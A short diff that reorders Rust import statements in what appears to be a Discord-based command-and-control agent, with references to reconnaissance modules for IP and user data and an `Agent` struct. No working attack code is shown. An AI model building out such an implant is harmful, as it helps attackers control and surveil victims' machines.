@@ -1,16 +1,22 @@
-use serde::{Deserialize, Serialize};
-use serenity::client::Context;
-use serenity::model::id::ChannelId;
-use std::io::{Read, Write};
+use crate::{
+    errors::DiscordC2Error,
+    os::recon::{ip, user},
+    discord_utils::channels::*,
+};
+
 use std::{
     env, fmt,
     fs::{File, OpenOptions},
+    io::{Read, Write},
     path::Path,
 };
 
-use crate::errors::DiscordC2Error;
-use crate::os::recon::{ip, user};
-use crate::utils::channels::{create_category_channel, create_text_channel};
+use serenity::{
+    client::Context,
+    model::id::ChannelId,
+};
+
+use serde::{Deserialize, Serialize};
 
 #[derive(Serialize, Deserialize)]
 pub struct Agent {
